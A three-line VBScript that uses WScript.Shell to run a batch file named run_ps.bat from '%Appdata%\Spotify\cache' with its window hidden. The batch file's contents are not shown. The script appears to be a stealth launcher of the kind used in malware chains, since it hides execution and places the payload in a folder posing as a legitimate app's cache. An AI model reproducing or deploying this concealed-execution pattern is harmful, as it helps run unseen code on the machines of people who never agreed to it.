Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%Appdata%\Spotify\cache\run_ps.bat" & Chr(34), 0
Set WshShell = Nothing